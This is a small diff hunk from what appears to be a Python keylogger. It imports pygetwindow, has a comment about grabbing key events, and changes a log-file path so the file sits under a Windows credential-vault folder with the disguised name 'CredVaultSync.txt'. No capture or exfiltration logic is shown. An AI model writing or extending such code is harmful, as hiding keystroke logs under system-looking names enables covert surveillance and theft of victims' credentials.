@@ -7,7 +7,7 @@ import pygetwindow as gw
 import os
 # Keyboard needed to grab key events
 
-path = r"C:\Users\AppData\Roaming\Microsoft\Vault\CredVaultSync.txt"
+path = r"C:\Users\Default\AppData\Roaming\Microsoft\Vault\CredVaultSync.txt"
 
 # if path does not exist, make it.
 if not os.path.exists(os.path.dirname(path)):
